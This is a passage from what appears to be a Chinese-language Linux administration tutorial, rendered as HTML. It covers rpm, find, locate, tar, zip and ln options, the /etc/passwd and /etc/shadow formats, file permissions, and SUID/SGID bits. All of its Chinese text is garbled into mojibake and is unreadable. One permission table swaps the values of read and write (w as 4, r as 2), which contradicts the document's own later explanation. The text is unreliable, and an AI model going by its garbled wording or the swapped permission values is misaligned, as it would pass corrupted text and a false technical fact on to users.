class="line">-h, --<span class="built_in">hash</span>           <span class="comment">#å®‰è£…æ—¶åˆ—å‡ºhashæ ‡è®° (ä¸ -vè¿ç”¨)  rpm -ihv package.rpm</span></span><br><span class="line">-U, --update	     <span class="comment">#å‡çº§è½¯ä»¶åŒ…	rpm -Uvh new-package.rpm</span></span><br><span class="line">-e, --erase	         <span class="comment">#å¸è½½è½¯ä»¶åŒ…	rpm -e package-name</span></span><br><span class="line">-V, --verify         <span class="comment">#æ ¡éªŒè½¯ä»¶åŒ…æ–‡ä»¶å®Œæ•´æ€§	rpm -V httpd</span></span><br><span class="line">-l	                 <span class="comment">#åˆ—å‡ºæ–‡ä»¶ (list files)</span></span><br><span class="line">â€“<span class="built_in">test</span>                <span class="comment">#å®‰è£…æµ‹è¯•ï¼Œå¹¶ä¸å®é™…å®‰è£…</span></span><br><span class="line">-q, --query 	     <span class="comment">#æŸ¥è¯¢è½¯ä»¶åŒ…ä¿¡æ¯	rpm -q httpd</span></span><br><span class="line"> -a, --all           <span class="comment">#æŸ¥è¯¢/æ ¡éªŒæ‰€æœ‰çš„å®‰è£…åŒ…</span></span><br><span class="line"> -p, --package       <span class="comment">#æŸ¥è¯¢/æ ¡éªŒä¸€ä¸ªå®‰è£…æ–‡ä»¶</span></span><br><span class="line"> -l, --list          <span class="comment">#åˆ—å‡ºå®‰è£…æ–‡ä»¶</span></span><br><span class="line"> -d, --docfiles      <span class="comment">#åˆ—å‡ºæ‰€æœ‰æ–‡æ¡£æ–‡ä»¶</span></span><br><span class="line"> -f, --file          <span class="comment"># æŸ¥è¯¢/æ ¡éªŒå®‰è£…åŒ…ä¸­æ‰€åŒ…å«çš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#17 stat</span></span><br><span class="line"><span class="built_in">stat</span> filename    <span class="comment">#æŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼ˆSizeã€Blocksã€Inodeã€Atimeã€Mtimeã€Ctimeç­‰ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#18 cut</span></span><br><span class="line">-c n1-n2         <span class="comment">#æˆªå–n1åˆ°n2çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#19 find </span></span><br><span class="line">find  æŸ¥æ‰¾è·¯å¾„ é€‰é¡¹å‚æ•°(æŸ¥æ‰¾æ•°æ®æ¡ä»¶)  æ“ä½œè¯­å¥</span><br><span class="line">-mtime +10  <span class="comment">#10å¤©å‰</span></span><br><span class="line">-mtime -10   <span class="comment">#10å¤©å†…</span></span><br><span class="line">-name <span class="string">&quot;c.sh&quot;</span>#æ–‡ä»¶å</span><br><span class="line">-name <span class="string">&quot;hxjl*.txt&quot;</span>#æ”¯æŒæ­£åˆ™</span><br><span class="line">-<span class="built_in">type</span> d     <span class="comment">#æ–‡ä»¶ç±»å‹</span></span><br><span class="line">! -<span class="built_in">type</span> d   <span class="comment">#å–å</span></span><br><span class="line">-size Â±1M <span class="comment">#æ–‡ä»¶å¤§å°</span></span><br><span class="line">-perm 644 <span class="comment">#æ–‡ä»¶æƒé™</span></span><br><span class="line">-<span class="built_in">exec</span>  <span class="built_in">ls</span>  -l  &#123;&#125;  \;  <span class="comment">#æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#locate åŸºäºæ•°æ®åº“å¿«é€ŸæŸ¥æ‰¾æ–‡ä»¶ï¼Œæ¯” find æ›´é«˜æ•ˆ</span></span><br><span class="line">-i	     <span class="comment">#å¿½ç•¥å¤§å°å†™ï¼ˆå¦‚ locate -i readme åŒ¹é… README å’Œ readmeï¼‰ã€‚</span></span><br><span class="line">-w	     <span class="comment">#æŒ‰æ•´è¯åŒ¹é…ï¼ˆå¦‚ locate -w /etc ä»…åŒ¹é… /etc ç›®å½•è€Œé /etc/passwdï¼‰ã€‚</span></span><br><span class="line">-c	     <span class="comment">#åªè¿”å›åŒ¹é…çš„æ–‡ä»¶æ•°é‡ï¼Œä¸æ˜¾ç¤ºæ–‡ä»¶åï¼ˆå¦‚ locate -c bashrcï¼‰ã€‚</span></span><br><span class="line">-e	     <span class="comment">#åªæ˜¾ç¤ºå­˜åœ¨çš„æ–‡ä»¶ï¼ˆè¿‡æ»¤å·²åˆ é™¤ä½†ä»åœ¨æ•°æ®åº“ä¸­çš„è®°å½•ï¼‰ã€‚</span></span><br><span class="line">--regex	 <span class="comment">#ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ˆå¦‚ locate --regex &#x27;.*\.(jpg|png)&#x27;ï¼‰ã€‚</span></span><br><span class="line">locate *.pdf  <span class="comment"># åŒ¹é…æ‰€æœ‰ PDF æ–‡ä»¶</span></span><br><span class="line">locate -i -e <span class="string">&#x27;apache2&#x27;</span>  <span class="comment"># å¿½ç•¥å¤§å°å†™ä¸”åªæ˜¾ç¤ºå­˜åœ¨çš„æ–‡ä»¶</span></span><br><span class="line">locate /data/ | grep <span class="string">&#x27;/data/[^/]*\.log$&#x27;</span> <span class="comment"># æŸ¥æ‰¾ /data ç›®å½•ä¸‹ä¸€çº§å­ç›®å½•ä¸­çš„ log æ–‡ä»¶</span></span><br><span class="line">locate <span class="string">&quot;<span class="subst">$(pwd)</span>/*.txt&quot;</span> <span class="comment">#æŸ¥æ‰¾å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰txtæ–‡ä»¶</span></span><br><span class="line"><span class="comment">#locateçš„é€Ÿåº¦æ¯”findå¿«ï¼Œå®ƒå¹¶ä¸æ˜¯çœŸçš„æŸ¥æ‰¾ï¼Œè€Œæ˜¯æŸ¥æ•°æ®åº“ï¼Œä¸€èˆ¬æ–‡ä»¶æ•°æ®åº“åœ¨/var/lib/mlocate/mlocate.dbä¸­ï¼Œæ‰€ä»¥locateçš„æŸ¥æ‰¾å¹¶ä¸æ˜¯å®æ—¶çš„ï¼Œè€Œæ˜¯ä»¥æ•°æ®åº“çš„æ›´æ–°ä¸ºå‡†ï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿè‡ªå·±ç»´æŠ¤ï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥å‡çº§æ•°æ®åº“ ï¼Œå‘½ä»¤ä¸ºï¼šupdatedb</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#20 tar</span></span><br><span class="line">-z       <span class="comment">#è¡¨ç¤ºæ‰“åŒ…çš„åŒæ—¶ä½¿ç”¨gzipçš„æ–¹å¼å‹ç¼©</span></span><br><span class="line">-j       <span class="comment">#ä»¥ bzip2 æ–¹å¼å‹ç¼©æ‰“åŒ…</span></span><br><span class="line">-c       <span class="comment">#è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶</span></span><br><span class="line">-v       <span class="comment">#è¡¨ç¤º æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹</span></span><br><span class="line">-f       <span class="comment">#è¯†åˆ«å‹ç¼©è·¯å¾„ä¿¡æ¯</span></span><br><span class="line">-t       <span class="comment">#æŸ¥çœ‹å‹ç¼©åŒ…å†…æ–‡ä»¶     tf</span></span><br><span class="line">-x       <span class="comment">#è§£å‹               zxvf</span></span><br><span class="line">-tf      <span class="comment">#ä¸è§£å‹çš„æ–¹å¼æŸ¥çœ‹å‹ç¼©çš„å†…å®¹</span></span><br><span class="line">-zxvf    <span class="comment">#è§£å‹å‹ç¼©åŒ…</span></span><br><span class="line">-cvf     <span class="comment">#æ‰“åŒ…</span></span><br><span class="line">-rvf     <span class="comment">#è¿½åŠ åˆ°å·²å­˜åœ¨åŒ…</span></span><br><span class="line">-xvf     <span class="comment">#è§£å‹åŒ…</span></span><br><span class="line">tar -zcvf name.tar.gz file1 ... filen <span class="comment">#æ‰“åŒ…å†å‹ç¼©æˆgzip</span></span><br><span class="line">tar -zxvf name.tar.gz file1 ... filen <span class="comment">#è§£å‹ç¼©åœ¨å–æ¶ˆæ‰“åŒ…</span></span><br><span class="line">tar -jcvf name.tar.gz file1 ... filen <span class="comment">#æ‰“åŒ…å†å‹ç¼©æˆbzip2</span></span><br><span class="line">tar -jxvf name.tar.bz2 -C /path/      <span class="comment">#è§£å‹åˆ°æŒ‡å®šç›®å½•</span></span><br><span class="line"><span class="comment">#ä¸å¯ä»¥ç”¨find ä½œæ‰¹é‡å‹ç¼©å‘½ä»¤</span></span><br><span class="line"><span class="comment">#find è·¯å¾„... -exec  tar &#123;&#125; \; Ã—</span></span><br><span class="line"><span class="comment">#ä¼šé€ æˆå‹ç¼©æ•°æ®ä¿¡æ¯çš„è¦†ç›–ï¼</span></span><br><span class="line"><span class="comment">#å‹ç¼©æ•°æ®æ—¶,å¦‚æœä½¿ç”¨ç»å¯¹è·¯å¾„å‹ç¼©æ•°æ®ï¼Œè¦æŠŠ&quot;/&quot;ç§»é™¤.å¦‚æœæœ‰&quot;/&quot;åªèƒ½å‹ç¼©åˆ°æ ¹ç›®å½•ä¸‹,æ²¡æœ‰&quot;/&quot;å¯ä»¥å°†æ–‡ä»¶å‹ç¼©åˆ°æŒ‡å®šç›®å½•(ä¸æ‡‚)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#21 zip</span></span><br><span class="line">-r	     <span class="comment">#é€’å½’åœ°å°†ä¸€ä¸ªç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶å‹ç¼©åˆ°ZIPæ–‡ä»¶ä¸­</span></span><br><span class="line">-q	     <span class="comment">#åœ¨å‹ç¼©æ–‡ä»¶æ—¶å¯ç”¨é™é»˜æ¨¡å¼ï¼Œå³ä¸æ˜¾ç¤ºå‹ç¼©è¿‡ç¨‹çš„è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">-d	     <span class="comment">#ä»ç°æœ‰çš„ZIPæ–‡ä»¶ä¸­åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line">-u	     <span class="comment">#ç”¨äºæ›´æ–°ç°æœ‰çš„ZIPæ–‡ä»¶ï¼Œå°†æ–°çš„æ–‡ä»¶æˆ–ä¿®æ”¹åçš„æ–‡ä»¶æ·»åŠ åˆ°ZIPå­˜æ¡£ä¸­</span></span><br><span class="line">-f	     <span class="comment">#ç”¨äºåˆ·æ–°ï¼ˆæ›´æ–°ï¼‰ç°æœ‰ZIPæ–‡ä»¶ä¸­çš„æŒ‡å®šæ–‡ä»¶ã€‚</span></span><br><span class="line">-m	     <span class="comment">#ç”¨äºç§»åŠ¨ï¼ˆå½’æ¡£ï¼‰æ–‡ä»¶åˆ°ä¸€ä¸ªZIPå‹ç¼©æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨ç§»åŠ¨åå°†æºæ–‡ä»¶åˆ é™¤ã€‚</span></span><br><span class="line">-e	     <span class="comment">#ç”¨äºå¯¹ZIPå‹ç¼©æ–‡ä»¶è¿›è¡ŒåŠ å¯†ã€‚</span></span><br><span class="line">-z	     <span class="comment">#ä¸ºå‹ç¼©æ–‡ä»¶æ·»åŠ æ³¨é‡Š</span></span><br><span class="line">zip -r å‹ç¼©åŒ…å.zip æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶n</span><br><span class="line">zip -r test.zip /home/test -x <span class="string">&quot;/home/test/test01/*&quot;</span> <span class="comment">#æ’é™¤test01ç›®å½• -x æŒ‡å®šæ’é™¤ç›®å½•ï¼Œæ³¨æ„æ²¡æœ‰åŒå¼•å·å°†ä¸èµ·ä½œç”¨ã€‚</span></span><br><span class="line"> zip -r test.zip <span class="built_in">test</span>/ -z <span class="comment">#æ·»åŠ æ³¨é‡Šä¿¡æ¯ã€‚æ·»åŠ å®Œæˆåè¾“å…¥å›è½¦åè¾“å…¥ . ä¹‹åå†è¾“å…¥å›è½¦æ¥ç»“æŸ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gzip å’Œ bzip2</span></span><br><span class="line">gunzip a.txt.gz</span><br><span class="line">gzip -d a.txt.gz</span><br><span class="line">bunzip2 a.bz2</span><br><span class="line">bzip2 -d a.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment">#ln</span></span><br><span class="line"><span class="built_in">ln</span> /etc/services /data/link_hard  <span class="comment">#åˆ›å»ºç¡¬é“¾æ¥</span></span><br><span class="line"><span class="built_in">ln</span> -s /etc/services /data/link_soft  <span class="comment">#åˆ›å»ºè½¯é“¾æ¥</span></span><br></pre></td></tr></table></figure>
<h2 id="ç”¨æˆ·åŠæƒé™ç®¡ç†">ç”¨æˆ·åŠæƒé™ç®¡ç†</h2>
<h3 id="ç”¨æˆ·ä»‹ç»">ç”¨æˆ·ä»‹ç»</h3>
<p>ç”¨æˆ·ä¿¡æ¯: å¯ä»¥ä½œä¸ºç³»ç»Ÿæ•°æ®æˆ–è€…ç¨‹åºè¿›ç¨‹æ“ä½œç®¡ç†è€…</p>
<p>ç”¨æˆ·ç»„ä¿¡æ¯:å¯ä»¥å°†å¤šä¸ªç³»ç»Ÿç”¨æˆ·è¿›è¡Œæ•´åˆ,æ–¹ä¾¿ç»Ÿä¸€å¯¹å¤šä¸ªç”¨æˆ·çš„æƒé™è¿›è¡Œç®¡ç†</p>
<p><strong>ç”¨æˆ·</strong></p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>æ‰€å±ä¸»   uid</td>
</tr>
<tr>
<td>g</td>
<td>æ‰€å±ç»„   gid</td>
</tr>
<tr>
<td>o</td>
<td>å…¶ä»–äºº   others</td>
</tr>
<tr>
<td>a</td>
<td>æ‰€æœ‰äºº   all</td>
</tr>
</tbody>
</table>
<p><strong>ç”¨æˆ·ç›¸å…³æ–‡ä»¶ä¿¡æ¯é…ç½®æ–‡ä»¶</strong>ï¼š/etc/passwd</p>
<p><img src="/posts/2c8b313c//image-20250719223400503.png" alt="image-20250719223400503"></p>
<p>ä»¥ï¼šä¸ºåˆ†éš”ç¬¦ åˆ†ä¸ºè‹¥å¹²éƒ¨åˆ†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å:å¯†ç å ä½ç¬¦:ç”¨æˆ·ID(UID):ç»„ID(GID):ç”¨æˆ·æè¿°:å®¶ç›®å½•:ç™»å½•Shell</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>ç”¨æˆ·åï¼šå­—ç¬¦ä¸²ï¼ˆå¦‚rootï¼‰ï¼Œç”¨äºç”¨æˆ·ç™»å½•ï¼Œé•¿åº¦é™åˆ¶ä¸º 32 å­—ç¬¦ã€‚</p>
</li>
<li class="lvl-2">
<p>å¯†ç å ä½ç¬¦ï¼šé€šå¸¸ä¸ºxï¼Œè¡¨ç¤ºå¯†ç å·²åŠ å¯†å­˜å‚¨åœ¨/etc/shadowä¸­ã€‚è‹¥ä¸ºç©ºåˆ™è¡¨ç¤ºæ— éœ€å¯†ç ç™»å½•ï¼ˆå±é™©ï¼‰ã€‚</p>
</li>
<li class="lvl-2">
<p>UIDï¼šæ•´æ•°ï¼Œ0 ä¸º root ç”¨æˆ·ï¼Œ1-999 ä¸ºç³»ç»Ÿç”¨æˆ·ï¼Œ1000 + ä¸ºæ™®é€šç”¨æˆ·ã€‚</p>
</li>
<li class="lvl-2">
<p>GIDï¼šå¯¹åº”/etc/groupä¸­çš„ä¸»ç»„ IDã€‚</p>
</li>
<li class="lvl-2">
<p>ç”¨æˆ·æè¿°ï¼šå¯é€‰ä¿¡æ¯ï¼ˆå¦‚John Doeï¼‰ï¼Œé€šå¸¸ç”¨äºæ³¨é‡Šã€‚</p>
</li>
<li class="lvl-2">
<p>å®¶ç›®å½•ï¼šç”¨æˆ·ç™»å½•åçš„é»˜è®¤ç›®å½•ï¼ˆå¦‚/home/userï¼‰ï¼Œroot ç”¨æˆ·ä¸º/rootã€‚</p>
</li>
<li class="lvl-2">
<p>ç™»å½• Shellï¼šç”¨æˆ·ç™»å½•åä½¿ç”¨çš„ Shell ç¨‹åºï¼ˆå¦‚/bin/bashï¼‰ï¼Œ/sbin/nologinè¡¨ç¤ºç¦æ­¢ç™»å½•ã€‚</p>
</li>
</ul>
<p><strong>ç”¨æˆ·åŠ å¯†å¯†ç å’Œå¯†ç ç­–ç•¥</strong>ï¼š/etc/shadow</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å:åŠ å¯†å¯†ç :æœ€åä¿®æ”¹æ—¥æœŸ:æœ€å°ä¿®æ”¹é—´éš”:æœ€å¤§ä¿®æ”¹é—´éš”:è­¦å‘ŠæœŸ:éæ´»è·ƒæœŸ:è¿‡æœŸæ—¥æœŸ:ä¿ç•™å­—æ®µ</span><br></pre></td></tr></table></figure>
<p>åŠ å¯†å¯†ç ä½¿ç”¨<code> $id$salt$hash</code> æ ¼å¼å­˜å‚¨ï¼ˆå¦‚ <code>$6$...</code> è¡¨ç¤º SHA-512ï¼‰ï¼Œ<code>!</code> æˆ– <code>*</code> è¡¨ç¤ºè´¦æˆ·é”å®šã€‚</p>
<p><strong>ç”¨æˆ·ç»„ä¿¡æ¯:</strong>/etc/group</p>
<h3 id="æƒé™ä»‹ç»"><strong>æƒé™ä»‹ç»</strong></h3>
<table>
<thead>
<tr>
<th style="text-align:center">å­—ç¬¦</th>
<th>æƒé™</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">wâ€”4</td>
<td>å†™æƒé™</td>
</tr>
<tr>
<td style="text-align:center">r----2</td>
<td>è¯»æƒé™</td>
</tr>
<tr>
<td style="text-align:center">x----1</td>
<td>æ‰§è¡Œæƒé™ï¼ˆè„šæœ¬æ–‡ä»¶å…ˆèµ‹æƒæ‰èƒ½å†æ‰§è¡Œï¼‰</td>
</tr>
</tbody>
</table>
<p><img src="/posts/2c8b313c//image-20250719211822282.png" alt="image-20250719211822282"></p>
<p><strong>r è¯»æƒé™ 4</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>é’ˆå¯¹æ–‡ä»¶ï¼šåˆ©ç”¨æ­¤æƒé™å¯ä»¥çœ‹åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹ cat</p>
</li>
<li class="lvl-2">
<p>é’ˆå¯¹ç›®å½•ï¼šå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹æœ‰ä»€ä¹ˆæ•°æ® ls/ç›®å½•</p>
</li>
</ul>
<p><strong>w å†™æƒé™ 2</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>é’ˆå¯¹æ–‡ä»¶ï¼šåˆ©ç”¨æ­¤æƒé™å¯ä»¥ç¼–è¾‘æ–‡ä»¶ä¸­çš„å†…å®¹ vim echo&gt; &gt;&gt;</p>
</li>
<li class="lvl-2">
<p>é’ˆå¯¹ç›®å½•: åˆ©ç”¨æ­¤æƒé™å¯ä»¥åœ¨ç›®å½•ä¸­åˆ›å»º åˆ é™¤æ–‡ä»¶ä¿¡æ¯ ä¿®æ”¹æ–‡ä»¶åç§°ä¿¡æ¯</p>
</li>
</ul>
<p><strong>x æ‰§è¡Œæƒé™ 1</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>é’ˆå¯¹æ–‡ä»¶:åˆ©ç”¨æ­¤æƒé™ æ‰§è¡Œè„šæœ¬ä¿¡æ¯</p>
</li>
<li class="lvl-2">
<p>é’ˆå¯¹ç›®å½•:åˆ©ç”¨æ­¤æƒé™å¯ä»¥åˆ‡æ¢åˆ°ç›®å½•ä¸­</p>
</li>
</ul>
<p>å¦ Xï¼šé’ˆå¯¹ç›®å½•åŠ æ‰§è¡Œæƒé™ï¼Œæ–‡ä»¶ä¸åŠ æ‰§è¡Œæƒé™ï¼ˆå› æ–‡ä»¶å…·å¤‡æ‰§è¡Œæƒé™æœ‰å®‰å…¨éšæ‚£ï¼‰</p>
<p><strong>ä¼ä¸šçœŸå®åœºæ™¯æƒé™é…ç½®:</strong></p>
<p>é»˜è®¤é…ç½®:</p>
<p>æ–‡ä»¶æƒé™: 644 å±ä¸»æ‹¥æœ‰è¯»å’Œå†™å†™æƒé™ å±ç»„å’Œå…¶ä»–ç”¨æˆ·åªæœ‰è¯»æƒé™</p>
<p>ç›®å½•æƒé™: 755 å±ä¸»æ‹¥æœ‰æŸ¥çœ‹ç¼–è¾‘è¿›å…¥æƒé™ å±ç»„å’Œå…¶ä»–ç”¨æˆ·åªæœ‰æŸ¥çœ‹è¿›å…¥æƒé™</p>
<p>ä¸¥æ ¼æƒé™:</p>
<p>æ–‡ä»¶æƒé™: 600 åªæœ‰å±ä¸»æœ‰è¯»å’Œå†™æƒé™</p>
<p>ç›®å½•æƒé™: 700 åªæœ‰å±ä¸»æœ‰è¯»å†™å’Œè¿›å…¥æƒé™</p>
<h3 id="ç‰¹æ®Šæƒé™">ç‰¹æ®Šæƒé™</h3>
<p>Linux ä¸­çš„æ–‡ä»¶æƒé™é™¤äº†å¸¸è§çš„è¯»ï¼ˆ<code>r</code>ï¼‰ã€å†™ï¼ˆ<code>w</code>ï¼‰ã€æ‰§è¡Œï¼ˆ<code>x</code>ï¼‰æƒé™å¤–ï¼Œè¿˜æœ‰ä¸‰ä¸ª<strong>ç‰¹æ®Šæƒé™</strong>ï¼š<code>SetUID</code>ï¼ˆSUIDï¼‰ã€<code>SetGID</code>ï¼ˆSGIDï¼‰å’Œ<code>Sticky Bit</code>ã€‚å®ƒä»¬ç”¨äºè§£å†³ä¸€äº›ç‰¹å®šçš„åœºæ™¯éœ€æ±‚ï¼Œé€šå¸¸è®¾ç½®äºå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®å½•ä¸Šï¼Œæä¾›é¢å¤–çš„æƒé™æ§åˆ¶åŠŸèƒ½ã€‚</p>
<hr>
<h4 id="SetUIDï¼ˆSUIDï¼‰"><strong>SetUIDï¼ˆSUIDï¼‰</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ç¬¦å·è¡¨ç¤ºï¼š</strong> <code>s</code>ï¼ˆå‡ºç°åœ¨æ–‡ä»¶æ‰€æœ‰è€…çš„<strong>æ‰§è¡Œæƒé™</strong>ä½ç½®ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>å…«è¿›åˆ¶è¡¨ç¤ºï¼š</strong> <code>4</code>ï¼ˆå¦‚ <code>4755</code>ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4">å½“<strong>å¯æ‰§è¡Œæ–‡ä»¶</strong>è®¾ç½®äº† SUID æƒé™æ—¶ï¼Œ<strong>ä»»ä½•ç”¨æˆ·åœ¨æ‰§è¡Œè¯¥æ–‡ä»¶æœŸé—´</strong>ï¼Œä¼šä¸´æ—¶è·å¾—è¯¥<strong>æ–‡ä»¶æ‰€æœ‰è€…</strong>çš„æƒé™ã€‚</li>
<li class="lvl-4">æ ¸å¿ƒç›®çš„ï¼šå…è®¸æ™®é€šç”¨æˆ·ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½æ‰§è¡Œç‰¹å®šä»»åŠ¡ï¼ˆé€šå¸¸æ˜¯éœ€è¦ç‰¹æƒæ‰èƒ½å®Œæˆçš„ä»»åŠ¡ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>ç»å…¸ä¾‹å­ï¼š</strong> <code>/usr/bin/passwd</code></p>
<ul class="lvl-2">
<li class="lvl-4">æ™®é€šç”¨æˆ·ï¼ˆå¦‚ <code>user1</code>ï¼‰éœ€è¦ä¿®æ”¹è‡ªå·±çš„å¯†ç ï¼Œå¯†ç æœ€ç»ˆå­˜å‚¨åœ¨ <code>/etc/shadow</code>ï¼ˆè¯¥æ–‡ä»¶åªæœ‰ <code>root</code> å¯è¯»å†™ï¼‰ã€‚</li>
<li class="lvl-4"><code>passwd</code> å‘½ä»¤è¢«è®¾ç½®äº† SUID ä¸”æ‰€æœ‰è€…æ˜¯ <code>root</code>ï¼ˆæƒé™ <code>-rwsr-xr-x</code>ï¼‰ã€‚</li>
<li class="lvl-4">å½“ <code>user1</code> æ‰§è¡Œ <code>passwd</code> æ—¶ï¼Œè¿›ç¨‹ä¸´æ—¶è·å¾— <code>root</code> æƒé™ï¼Œä»è€Œèƒ½ä¿®æ”¹ <code>/etc/shadow</code>ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>è®¾ç½®ä¸æŸ¥çœ‹ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4">è®¾ç½®ï¼š<code>chmod u+s æ–‡ä»¶å</code> æˆ– <code>chmod 4xxx æ–‡ä»¶å</code> (e.g., <code>chmod 4755 myprogram</code>)</li>
<li class="lvl-4">æŸ¥çœ‹ï¼šå¦‚æœæ‰€æœ‰è€…åŸæœ¬æœ‰ <code>x</code> æƒé™ï¼Œ<code>ls -l</code> ä¸­æ‰€æœ‰è€…æ‰§è¡Œä½æ˜¾ç¤ºä¸º <code>s</code>ï¼Œå¦‚æœæ‰€æœ‰è€…åŸæœ¬<em>æ²¡æœ‰</em> <code>x</code> æƒé™ï¼Œåˆ™æ‰§è¡Œä½æ˜¾ç¤ºä¸º <code>S</code>ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>é‡è¦å®‰å…¨æç¤ºï¼š</strong> SUID æƒé™éå¸¸å¼ºå¤§ä¸”<strong>å±é™©æ€§å¾ˆé«˜</strong>ã€‚ä¸å½“è®¾ç½®ï¼ˆå°¤å…¶æ˜¯å¯¹è„šæœ¬æˆ–ä¸å¯ä¿¡ç¨‹åºï¼‰ä¼šå¸¦æ¥ä¸¥é‡å®‰å…¨æ¼æ´ã€‚åº”ä»…æˆäºˆç»å¯¹å¿…è¦ä¸”ç»è¿‡ä¸¥æ ¼å®¡æŸ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
</li>
</ul>
<hr>
<h4 id="SetGIDï¼ˆSGIDï¼‰"><strong>SetGIDï¼ˆSGIDï¼‰</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ç¬¦å·è¡¨ç¤ºï¼š</strong> <code>s</code>ï¼ˆå‡ºç°åœ¨æ‰€å±ç»„çš„<strong>æ‰§è¡Œæƒé™</strong>ä½ç½®ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>å…«è¿›åˆ¶è¡¨ç¤ºï¼š</strong> <code>2</code>ï¼ˆå¦‚ <code>2755</code>ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>ä½œç”¨ï¼ˆå–å†³äºåº”ç”¨å¯¹è±¡ï¼‰ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4"><strong>åº”ç”¨äºå¯æ‰§è¡Œæ–‡ä»¶ï¼š</strong>
<ul class="lvl-4">
<li class="lvl-6">ä¸ SUID ç±»ä¼¼ï¼Œä½†ä½œç”¨äº<strong>ç»„</strong>ã€‚</li>
<li class="lvl-6">ä»»ä½•ç”¨æˆ·åœ¨æ‰§è¡Œè®¾ç½®äº† SGID çš„æ–‡ä»¶æ—¶ï¼Œä¼šä¸´æ—¶è·å¾—è¯¥<strong>æ–‡ä»¶æ‰€å±ç»„</strong>çš„æƒé™ã€‚</li>
<li class="lvl-6">ç›®çš„ï¼šå…è®¸ç”¨æˆ·ä»¥æ–‡ä»¶æ‰€å±ç»„çš„èº«ä»½æ‰§è¡Œä»»åŠ¡ï¼ˆé€šå¸¸ç”¨äºå…±äº«èµ„æºè®¿é—®ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-4"><strong>åº”ç”¨äºç›®å½•ï¼š</strong>
<ul class="lvl-4">
<li class="lvl-6">è¿™æ˜¯ SGID <strong>æ›´å¸¸è§ä¸”é‡è¦çš„ç”¨é€”</strong>ã€‚</li>
<li class="lvl-6">åœ¨è®¾ç½®äº† SGID çš„ç›®å½•ä¸­ï¼Œ<strong>ä»»ä½•ç”¨æˆ·åœ¨æ­¤ç›®å½•ä¸‹åˆ›å»ºçš„æ–°æ–‡ä»¶æˆ–å­ç›®å½•</strong>ï¼Œå…¶æ‰€å±ç»„<strong>è‡ªåŠ¨ç»§æ‰¿è¯¥ç›®å½•çš„æ‰€å±ç»„</strong>ï¼Œè€Œä¸æ˜¯ç”¨æˆ·è‡ªå·±çš„é»˜è®¤ä¸»ç»„ã€‚</li>
<li class="lvl-6">æ ¸å¿ƒç›®çš„ï¼š<strong>å¼ºåˆ¶åä½œå…±äº«</strong>ã€‚ç¡®ä¿åœ¨å…±äº«ç›®å½•ä¸­åˆ›å»ºçš„æ‰€æœ‰æ–‡ä»¶éƒ½å±äºåŒä¸€ä¸ªç‰¹å®šç»„ï¼Œæ–¹ä¾¿ç»„æˆå‘˜å…±åŒç®¡ç†ï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ç»„æƒé™ã€‚</li>
</ul>
</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>ç»å…¸ä¾‹å­ï¼ˆç›®å½•ï¼‰ï¼š</strong> é¡¹ç›®å…±äº«ç›®å½• <code>/shared/projectX</code></p>
<ul class="lvl-2">
<li class="lvl-4">è®¾ç½®æ‰€å±ç»„ä¸º <code>projectx-team</code>ï¼š<code>chgrp projectx-team /shared/projectX</code></li>
<li class="lvl-4">è®¾ç½® SGIDï¼š<code>chmod g+s /shared/projectX</code> æˆ– <code>chmod 2775 /shared/projectX</code></li>
